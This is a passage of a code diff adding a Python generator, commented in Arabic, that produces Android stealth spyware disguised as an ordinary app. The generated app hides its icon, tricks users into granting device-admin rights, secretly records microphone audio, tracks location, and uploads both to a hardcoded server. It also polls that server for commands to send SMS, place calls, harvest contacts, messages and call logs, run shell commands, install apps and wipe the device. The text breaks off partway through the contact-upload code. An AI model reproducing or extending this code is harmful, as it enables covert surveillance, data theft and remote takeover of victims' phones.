@@ -1,0 +1,1329 @@
+#!/usr/bin/env python3
+"""
+مولد الكود للتحكم عن بعد - Remote Control Code Generator
+يقوم بتوليد كود Android مخصص للتحكم في الأجهزة عن بُعد
+"""
+
+import os
+import json
+import base64
+import hashlib
+from datetime import datetime
+from typing import Dict, List, Any
+
+class RemoteControlGenerator:
+    def __init__(self, server_url: str = "https://e5h6i7cn9xxe.manus.space"):
+        self.server_url = server_url
+        self.output_dir = "/home/ubuntu/monitoring-app/generated_apps"
+        self.template_dir = "/home/ubuntu/monitoring-app/android-app"
+        
+        # إنشاء مجلد الإخراج
+        os.makedirs(self.output_dir, exist_ok=True)
+    
+    def generate_unique_id(self) -> str:
+        """توليد معرف فريد للتطبيق"""
+        timestamp = str(int(datetime.now().timestamp()))
+        random_data = os.urandom(16)
+        unique_string = timestamp + base64.b64encode(random_data).decode()
+        return hashlib.md5(unique_string.encode()).hexdigest()[:12]
+    
+    def generate_stealth_manifest(self, app_id: str, disguise_config: Dict) -> str:
+        """توليد ملف البيان المخفي"""
+        package_name = f"com.{disguise_config['category']}.{disguise_config['name'].lower().replace(' ', '')}"
+        
+        manifest_content = f'''<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="{package_name}"
+    android:versionCode="1"
+    android:versionName="1.0"
+    android:installLocation="auto">
+
+    <!-- الصلاحيات المخفية -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+    <uses-permission android:name="android.permission.MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.BIND_INPUT_METHOD" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.DEVICE_ADMIN" />
+    
+    <!-- صلاحيات خاصة للتحكم الكامل -->
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+
+    <uses-sdk
+        android:minSdkVersion="21"
+        android:targetSdkVersion="33" />
+
+    <application
+        android:allowBackup="false"
+        android:icon="@mipmap/{disguise_config['icon']}"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true"
+        android:requestLegacyExternalStorage="true"
+        android:persistent="true">
+
+        <!-- النشاط الرئيسي المموه -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:screenOrientation="portrait"
+            android:launchMode="singleTop"
+            android:theme="@style/Theme.{disguise_config['name'].replace(' ', '')}">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- خدمة المراقبة المخفية -->
+        <service
+            android:name=".StealthMonitoringService"
+            android:enabled="true"
+            android:exported="false"
+            android:process=":background"
+            android:foregroundServiceType="microphone|camera|location" />
+
+        <!-- خدمة التحكم عن بعد -->
+        <service
+            android:name=".RemoteControlService"
+            android:enabled="true"
+            android:exported="false"
+            android:process=":remote" />
+
+        <!-- خدمة الإدارة المخفية -->
+        <service
+            android:name=".DeviceAdminService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- مستقبل إعادة التشغيل -->
+        <receiver
+            android:name=".StealthBootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:priority="1000">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- مستقبل الأوامر المخفية -->
+        <receiver
+            android:name=".CommandReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- إدارة الجهاز -->
+        <receiver
+            android:name=".DeviceAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+
+</manifest>'''
+        return manifest_content
+    
+    def generate_stealth_main_activity(self, app_id: str, disguise_config: Dict) -> str:
+        """توليد النشاط الرئيسي المموه"""
+        
+        activity_content = f'''package com.{disguise_config['category']}.{disguise_config['name'].lower().replace(' ', '')};
+
+import android.Manifest;
+import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
+import android.util.Log;
+import android.view.View;
+import android.widget.Toast;
+import androidx.annotation.NonNull;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+public class MainActivity extends Activity {{
+    private static final String TAG = "{disguise_config['name']}";
+    private static final int PERMISSION_REQUEST_CODE = 1001;
+    private static final String SERVER_URL = "{self.server_url}";
+    private static final String APP_ID = "{app_id}";
+    
+    private DevicePolicyManager devicePolicyManager;
+    private ComponentName deviceAdminReceiver;
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {{
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        // إخفاء التطبيق من قائمة التطبيقات الحديثة
+        hideFromRecents();
+        
+        // طلب الصلاحيات
+        requestAllPermissions();
+        
+        // بدء الخدمات المخفية
+        startStealthServices();
+        
+        // إعداد إدارة الجهاز
+        setupDeviceAdmin();
+        
+        // إخفاء التطبيق بعد 3 ثوان
+        new Handler().postDelayed(() -> {{
+            hideApp();
+        }}, 3000);
+    }}
+    
+    private void hideFromRecents() {{
+        try {{
+            // إخفاء من قائمة التطبيقات الحديثة
+            setTaskDescription(new android.app.ActivityManager.TaskDescription(
+                "{disguise_config['display_name']}", 
+                null, 
+                getResources().getColor(android.R.color.transparent)
+            ));
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error hiding from recents", e);
+        }}
+    }}
+    
+    private void requestAllPermissions() {{
+        String[] permissions = {{
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.CAMERA,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.WRITE_CALL_LOG,
+            Manifest.permission.GET_ACCOUNTS
+        }};
+        
+        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
+    }}
+    
+    private void startStealthServices() {{
+        try {{
+            // بدء خدمة المراقبة المخفية
+            Intent monitoringIntent = new Intent(this, StealthMonitoringService.class);
+            monitoringIntent.putExtra("server_url", SERVER_URL);
+            monitoringIntent.putExtra("app_id", APP_ID);
+            startForegroundService(monitoringIntent);
+            
+            // بدء خدمة التحكم عن بعد
+            Intent remoteIntent = new Intent(this, RemoteControlService.class);
+            remoteIntent.putExtra("server_url", SERVER_URL);
+            remoteIntent.putExtra("app_id", APP_ID);
+            startService(remoteIntent);
+            
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error starting stealth services", e);
+        }}
+    }}
+    
+    private void setupDeviceAdmin() {{
+        try {{
+            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            deviceAdminReceiver = new ComponentName(this, DeviceAdminReceiver.class);
+            
+            if (!devicePolicyManager.isAdminActive(deviceAdminReceiver)) {{
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminReceiver);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
+                    "يحتاج التطبيق لصلاحيات إدارية لحماية الجهاز");
+                startActivity(intent);
+            }}
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error setting up device admin", e);
+        }}
+    }}
+    
+    private void hideApp() {{
+        try {{
+            // إخفاء أيقونة التطبيق من الشاشة الرئيسية
+            PackageManager packageManager = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            );
+            
+            // الانتقال للخلفية
+            moveTaskToBack(true);
+            
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error hiding app", e);
+        }}
+    }}
+    
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {{
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {{
+            // التحقق من الصلاحيات الممنوحة
+            boolean allGranted = true;
+            for (int result : grantResults) {{
+                if (result != PackageManager.PERMISSION_GRANTED) {{
+                    allGranted = false;
+                    break;
+                }}
+            }}
+            
+            if (!allGranted) {{
+                // إعادة طلب الصلاحيات المهمة
+                new Handler().postDelayed(() -> requestAllPermissions(), 2000);
+            }}
+        }}
+    }}
+    
+    @Override
+    protected void onResume() {{
+        super.onResume();
+        // إخفاء التطبيق عند العودة إليه
+        new Handler().postDelayed(() -> hideApp(), 1000);
+    }}
+    
+    @Override
+    public void onBackPressed() {{
+        // منع إغلاق التطبيق بزر الرجوع
+        moveTaskToBack(true);
+    }}
+}}'''
+        return activity_content
+    
+    def generate_stealth_monitoring_service(self, app_id: str) -> str:
+        """توليد خدمة المراقبة المخفية"""
+        
+        service_content = f'''package com.monitoring.stealth;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.media.MediaRecorder;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.provider.Settings;
+import android.util.Log;
+import androidx.annotation.Nullable;
+import okhttp3.*;
+import org.json.JSONException;
+import org.json.JSONObject;
+import java.io.File;
+import java.io.IOException;
+import java.util.concurrent.TimeUnit;
+
+public class StealthMonitoringService extends Service implements LocationListener {{
+    private static final String TAG = "SystemService";
+    private static final String CHANNEL_ID = "system_channel";
+    private static final int NOTIFICATION_ID = 1001;
+    
+    private String serverUrl;
+    private String appId;
+    private String deviceId;
+    
+    private MediaRecorder mediaRecorder;
+    private boolean isRecording = false;
+    private LocationManager locationManager;
+    private OkHttpClient httpClient;
+    private Handler handler;
+    
+    @Override
+    public void onCreate() {{
+        super.onCreate();
+        
+        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        
+        // إنشاء قناة الإشعارات المخفية
+        createNotificationChannel();
+        
+        // بدء الخدمة في المقدمة مع إشعار مخفي
+        startForeground(NOTIFICATION_ID, createStealthNotification());
+        
+        // إعداد HTTP Client
+        httpClient = new OkHttpClient.Builder()
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .readTimeout(30, TimeUnit.SECONDS)
+                .writeTimeout(30, TimeUnit.SECONDS)
+                .build();
+        
+        handler = new Handler(Looper.getMainLooper());
+        
+        // بدء المراقبة
+        startMonitoring();
+    }}
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {{
+        if (intent != null) {{
+            serverUrl = intent.getStringExtra("server_url");
+            appId = intent.getStringExtra("app_id");
+        }}
+        
+        // إعادة تشغيل الخدمة تلقائياً
+        return START_STICKY;
+    }}
+    
+    private void createNotificationChannel() {{
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID,
+                "خدمة النظام",
+                NotificationManager.IMPORTANCE_LOW
+            );
+            channel.setDescription("خدمة نظام أساسية");
+            channel.setShowBadge(false);
+            channel.setSound(null, null);
+            channel.enableVibration(false);
+            
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            manager.createNotificationChannel(channel);
+        }}
+    }}
+    
+    private Notification createStealthNotification() {{
+        return new Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle("خدمة النظام")
+                .setContentText("تعمل في الخلفية")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setOngoing(true)
+                .setAutoCancel(false)
+                .setPriority(Notification.PRIORITY_LOW)
+                .build();
+    }}
+    
+    private void startMonitoring() {{
+        try {{
+            // تسجيل الجهاز
+            registerDevice();
+            
+            // بدء مراقبة الموقع
+            startLocationMonitoring();
+            
+            // بدء التسجيل الصوتي
+            startAudioRecording();
+            
+            // بدء مراقبة الأنشطة
+            startActivityMonitoring();
+            
+            // إرسال نبضة الحياة كل 30 ثانية
+            startHeartbeat();
+            
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error starting monitoring", e);
+        }}
+    }}
+    
+    private void registerDevice() {{
+        try {{
+            JSONObject deviceInfo = new JSONObject();
+            deviceInfo.put("device_id", deviceId);
+            deviceInfo.put("app_id", appId);
+            deviceInfo.put("device_name", Build.MODEL);
+            deviceInfo.put("android_version", Build.VERSION.RELEASE);
+            deviceInfo.put("stealth_mode", true);
+            
+            RequestBody body = RequestBody.create(
+                deviceInfo.toString(),
+                MediaType.parse("application/json")
+            );
+            
+            Request request = new Request.Builder()
+                    .url(serverUrl + "/api/android/register")
+                    .post(body)
+                    .build();
+            
+            httpClient.newCall(request).enqueue(new Callback() {{
+                @Override
+                public void onFailure(@NonNull Call call, @NonNull IOException e) {{
+                    Log.e(TAG, "Registration failed", e);
+                    // إعادة المحاولة بعد 60 ثانية
+                    handler.postDelayed(() -> registerDevice(), 60000);
+                }}
+                
+                @Override
+                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
+                    if (response.isSuccessful()) {{
+                        Log.d(TAG, "Device registered successfully");
+                    }} else {{
+                        Log.e(TAG, "Registration failed: " + response.code());
+                    }}
+                }}
+            }});
+            
+        }} catch (JSONException e) {{
+            Log.e(TAG, "Error creating registration data", e);
+        }}
+    }}
+    
+    private void startLocationMonitoring() {{
+        try {{
+            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            
+            if (locationManager != null) {{
+                // طلب تحديثات الموقع كل 5 دقائق
+                locationManager.requestLocationUpdates(
+                    LocationManager.GPS_PROVIDER,
+                    300000, // 5 دقائق
+                    100,    // 100 متر
+                    this
+                );
+                
+                locationManager.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER,
+                    300000,
+                    100,
+                    this
+                );
+            }}
+        }} catch (SecurityException e) {{
+            Log.e(TAG, "Location permission denied", e);
+        }}
+    }}
+    
+    private void startAudioRecording() {{
+        try {{
+            File audioDir = new File(getExternalFilesDir(null), "audio");
+            if (!audioDir.exists()) {{
+                audioDir.mkdirs();
+            }}
+            
+            // تسجيل صوتي كل 10 دقائق
+            handler.post(new Runnable() {{
+                @Override
+                public void run() {{
+                    recordAudio();
+                    handler.postDelayed(this, 600000); // 10 دقائق
+                }}
+            }});
+            
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error starting audio recording", e);
+        }}
+    }}
+    
+    private void recordAudio() {{
+        try {{
+            if (isRecording) return;
+            
+            File audioFile = new File(getExternalFilesDir(null), 
+                "audio/recording_" + System.currentTimeMillis() + ".m4a");
+            
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
+            
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            isRecording = true;
+            
+            // إيقاف التسجيل بعد دقيقتين
+            handler.postDelayed(() -> {{
+                stopAudioRecording();
+                uploadAudioFile(audioFile);
+            }}, 120000);
+            
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error recording audio", e);
+        }}
+    }}
+    
+    private void stopAudioRecording() {{
+        try {{
+            if (mediaRecorder != null && isRecording) {{
+                mediaRecorder.stop();
+                mediaRecorder.release();
+                mediaRecorder = null;
+                isRecording = false;
+            }}
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error stopping audio recording", e);
+        }}
+    }}
+    
+    private void uploadAudioFile(File audioFile) {{
+        try {{
+            RequestBody fileBody = RequestBody.create(audioFile, MediaType.parse("audio/m4a"));
+            RequestBody deviceIdBody = RequestBody.create(deviceId, MediaType.parse("text/plain"));
+            RequestBody appIdBody = RequestBody.create(appId, MediaType.parse("text/plain"));
+            
+            MultipartBody requestBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("device_id", null, deviceIdBody)
+                    .addFormDataPart("app_id", null, appIdBody)
+                    .addFormDataPart("audio_file", audioFile.getName(), fileBody)
+                    .addFormDataPart("stealth", "true")
+                    .build();
+            
+            Request request = new Request.Builder()
+                    .url(serverUrl + "/api/android/upload/audio")
+                    .post(requestBody)
+                    .build();
+            
+            httpClient.newCall(request).enqueue(new Callback() {{
+                @Override
+                public void onFailure(@NonNull Call call, @NonNull IOException e) {{
+                    Log.e(TAG, "Audio upload failed", e);
+                }}
+                
+                @Override
+                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
+                    if (response.isSuccessful()) {{
+                        Log.d(TAG, "Audio uploaded successfully");
+                        audioFile.delete(); // حذف الملف المحلي
+                    }}
+                }}
+            }});
+            
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error uploading audio", e);
+        }}
+    }}
+    
+    private void startActivityMonitoring() {{
+        // مراقبة الأنشطة والتطبيقات المستخدمة
+        handler.post(new Runnable() {{
+            @Override
+            public void run() {{
+                monitorCurrentActivity();
+                handler.postDelayed(this, 30000); // كل 30 ثانية
+            }}
+        }});
+    }}
+    
+    private void monitorCurrentActivity() {{
+        // تسجيل النشاط الحالي
+        // يمكن إضافة المزيد من التفاصيل هنا
+    }}
+    
+    private void startHeartbeat() {{
+        handler.post(new Runnable() {{
+            @Override
+            public void run() {{
+                sendHeartbeat();
+                handler.postDelayed(this, 30000); // كل 30 ثانية
+            }}
+        }});
+    }}
+    
+    private void sendHeartbeat() {{
+        try {{
+            JSONObject heartbeat = new JSONObject();
+            heartbeat.put("device_id", deviceId);
+            heartbeat.put("app_id", appId);
+            heartbeat.put("status", "active");
+            heartbeat.put("stealth_mode", true);
+            heartbeat.put("timestamp", System.currentTimeMillis());
+            
+            RequestBody body = RequestBody.create(
+                heartbeat.toString(),
+                MediaType.parse("application/json")
+            );
+            
+            Request request = new Request.Builder()
+                    .url(serverUrl + "/api/android/heartbeat")
+                    .post(body)
+                    .build();
+            
+            httpClient.newCall(request).enqueue(new Callback() {{
+                @Override
+                public void onFailure(@NonNull Call call, @NonNull IOException e) {{
+                    Log.e(TAG, "Heartbeat failed", e);
+                }}
+                
+                @Override
+                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
+                    if (response.isSuccessful()) {{
+                        // التحقق من وجود أوامر جديدة
+                        checkForCommands();
+                    }}
+                }}
+            }});
+            
+        }} catch (JSONException e) {{
+            Log.e(TAG, "Error creating heartbeat", e);
+        }}
+    }}
+    
+    private void checkForCommands() {{
+        // التحقق من الأوامر الواردة من الخادم
+        Request request = new Request.Builder()
+                .url(serverUrl + "/api/android/commands/" + deviceId)
+                .get()
+                .build();
+        
+        httpClient.newCall(request).enqueue(new Callback() {{
+            @Override
+            public void onFailure(@NonNull Call call, @NonNull IOException e) {{
+                Log.e(TAG, "Failed to check commands", e);
+            }}
+            
+            @Override
+            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
+                if (response.isSuccessful()) {{
+                    String responseBody = response.body().string();
+                    processCommands(responseBody);
+                }}
+            }}
+        }});
+    }}
+    
+    private void processCommands(String commandsJson) {{
+        try {{
+            JSONObject commands = new JSONObject(commandsJson);
+            
+            // معالجة الأوامر المختلفة
+            if (commands.has("record_audio") && commands.getBoolean("record_audio")) {{
+                recordAudio();
+            }}
+            
+            if (commands.has("get_location") && commands.getBoolean("get_location")) {{
+                sendCurrentLocation();
+            }}
+            
+            if (commands.has("take_screenshot") && commands.getBoolean("take_screenshot")) {{
+                takeScreenshot();
+            }}
+            
+        }} catch (JSONException e) {{
+            Log.e(TAG, "Error processing commands", e);
+        }}
+    }}
+    
+    private void sendCurrentLocation() {{
+        try {{
+            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (location == null) {{
+                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            }}
+            
+            if (location != null) {{
+                JSONObject locationData = new JSONObject();
+                locationData.put("device_id", deviceId);
+                locationData.put("latitude", location.getLatitude());
+                locationData.put("longitude", location.getLongitude());
+                locationData.put("accuracy", location.getAccuracy());
+                locationData.put("timestamp", location.getTime());
+                
+                RequestBody body = RequestBody.create(
+                    locationData.toString(),
+                    MediaType.parse("application/json")
+                );
+                
+                Request request = new Request.Builder()
+                        .url(serverUrl + "/api/android/location")
+                        .post(body)
+                        .build();
+                
+                httpClient.newCall(request).enqueue(new Callback() {{
+                    @Override
+                    public void onFailure(@NonNull Call call, @NonNull IOException e) {{
+                        Log.e(TAG, "Location upload failed", e);
+                    }}
+                    
+                    @Override
+                    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
+                        if (response.isSuccessful()) {{
+                            Log.d(TAG, "Location sent successfully");
+                        }}
+                    }}
+                }});
+            }}
+        }} catch (Exception e) {{
+            Log.e(TAG, "Error sending location", e);
+        }}
+    }}
+    
+    private void takeScreenshot() {{
+        // تنفيذ التقاط الشاشة
+        // يتطلب صلاحيات خاصة
+    }}
+    
+    @Override
+    public void onLocationChanged(Location location) {{
+        // إرسال الموقع الجديد
+        sendCurrentLocation();
+    }}
+    
+    @Override
+    public void onStatusChanged(String provider, int status, Bundle extras) {{}}
+    
+    @Override
+    public void onProviderEnabled(String provider) {{}}
+    
+    @Override
+    public void onProviderDisabled(String provider) {{}}
+    
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {{
+        return null;
+    }}
+    
+    @Override
+    public void onDestroy() {{
+        super.onDestroy();
+        
+        // إيقاف التسجيل
+        stopAudioRecording();
+        
+        // إيقاف مراقبة الموقع
+        if (locationManager != null) {{
+            locationManager.removeUpdates(this);
+        }}
+        
+        // إعادة تشغيل الخدمة
+        Intent restartIntent = new Intent(this, StealthMonitoringService.class);
+        restartIntent.putExtra("server_url", serverUrl);
+        restartIntent.putExtra("app_id", appId);
+        startService(restartIntent);
+    }}
+}}'''
+        return service_content
+    
+    def generate_remote_control_service(self, app_id: str) -> str:
+        """توليد خدمة التحكم عن بعد"""
+        
+        service_content = f'''package com.monitoring.stealth;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.util.Log;
+import androidx.annotation.Nullable;
+import okhttp3.*;
+import org.json.JSONException;
+import org.json.JSONObject;
+import java.io.IOException;
+import java.util.concurrent.TimeUnit;
+
+public class RemoteControlService extends Service {{
+    private static final String TAG = "RemoteControl";
+    
+    private String serverUrl;
+    private String appId;
+    private String deviceId;
+    private OkHttpClient httpClient;
+    private Handler handler;
+    
+    @Override
+    public void onCreate() {{
+        super.onCreate();
+        
+        httpClient = new OkHttpClient.Builder()
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .readTimeout(30, TimeUnit.SECONDS)
+                .writeTimeout(30, TimeUnit.SECONDS)
+                .build();
+        
+        handler = new Handler(Looper.getMainLooper());
+        
+        // بدء استقبال الأوامر
+        startCommandListener();
+    }}
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {{
+        if (intent != null) {{
+            serverUrl = intent.getStringExtra("server_url");
+            appId = intent.getStringExtra("app_id");
+            deviceId = android.provider.Settings.Secure.getString(
+                getContentResolver(), 
+                android.provider.Settings.Secure.ANDROID_ID
+            );
+        }}
+        
+        return START_STICKY;
+    }}
+    
+    private void startCommandListener() {{
+        handler.post(new Runnable() {{
+            @Override
+            public void run() {{
+                checkForRemoteCommands();
+                handler.postDelayed(this, 10000); // كل 10 ثوان
+            }}
+        }});
+    }}
+    
+    private void checkForRemoteCommands() {{
+        Request request = new Request.Builder()
+                .url(serverUrl + "/api/android/remote-commands/" + deviceId)
+                .get()
+                .build();
+        
+        httpClient.newCall(request).enqueue(new Callback() {{
+            @Override
+            public void onFailure(@NonNull Call call, @NonNull IOException e) {{
+                Log.e(TAG, "Failed to check remote commands", e);
+            }}
+            
+            @Override
+            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
+                if (response.isSuccessful()) {{
+                    String responseBody = response.body().string();
+                    processRemoteCommands(responseBody);
+                }}
+            }}
+        }});
+    }}
+    
+    private void processRemoteCommands(String commandsJson) {{
+        try {{
+            JSONObject commands = new JSONObject(commandsJson);
+            
+            if (commands.has("commands")) {{
+                JSONObject commandList = commands.getJSONObject("commands");
+                
+                // أوامر التحكم المختلفة
+                if (commandList.has("send_sms")) {{
+                    JSONObject smsData = commandList.getJSONObject("send_sms");
+                    sendSMS(smsData.getString("number"), smsData.getString("message"));
+                }}
+                
+                if (commandList.has("make_call")) {{
+                    String number = commandList.getString("make_call");
+                    makeCall(number);
+                }}
+                
+                if (commandList.has("get_contacts")) {{
+                    getContacts();
+                }}
+                
+                if (commandList.has("get_sms")) {{
+                    getSMSMessages();
+                }}
+                
+                if (commandList.has("get_call_log")) {{
+                    getCallLog();
+                }}
+                
+                if (commandList.has("execute_shell")) {{
+                    String command = commandList.getString("execute_shell");
+                    executeShellCommand(command);
+                }}
+                
+                if (commandList.has("install_app")) {{
+                    String apkUrl = commandList.getString("install_app");
+                    installApp(apkUrl);
+                }}
+                
+                if (commandList.has("uninstall_app")) {{
+                    String packageName = commandList.getString("uninstall_app");
+                    uninstallApp(packageName);
+                }}
+                
+                if (commandList.has("lock_device")) {{
+                    lockDevice();
+                }}
+                
+                if (commandList.has("wipe_device")) {{
+                    wipeDevice();
+                }}
+            }}
+            
+        }} catch (JSONException e) {{
+            Log.e(TAG, "Error processing remote commands", e);
+        }}
+    }}
+    
+    private void sendSMS(String number, String message) {{
+        try {{
+            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
+            smsManager.sendTextMessage(number, null, message, null, null);
+            
+            reportCommandResult("send_sms", "success", "SMS sent to " + number);
+        }} catch (Exception e) {{
+            reportCommandResult("send_sms", "error", e.getMessage());
+        }}
+    }}
+    
+    private void makeCall(String number) {{
+        try {{
+            Intent callIntent = new Intent(Intent.ACTION_CALL);
+            callIntent.setData(android.net.Uri.parse("tel:" + number));
+            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(callIntent);
+            
+            reportCommandResult("make_call", "success", "Call initiated to " + number);
+        }} catch (Exception e) {{
+            reportCommandResult("make_call", "error", e.getMessage());
+        }}
+    }}
+    
+    private void getContacts() {{
+        try {{
+            // قراءة جهات الاتصال وإرسالها للخادم
+            android.database.Cursor cursor = getContentResolver().query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null
+            );
+            
+            JSONObject contactsData = new JSONObject();
+            org.json.JSONArray contactsArray = new org.json.JSONArray();
+            
+            if (cursor != null) {{
+                while (cursor.moveToNext()) {{
+                    JSONObject contact = new JSONObject();
+                    String name = cursor.getString(cursor.getColumnIndex(
+                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String number = cursor.getString(cursor.getColumnIndex(
+                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    
+                    contact.put("name", name);
+                    contact.put("number", number);
+                    contactsArray.put(contact);
+                }}
+                cursor.close();
+            }}
+            
+            contactsData.put("device_id", deviceId);
+            contactsData.put("contacts", contactsArray);
+            
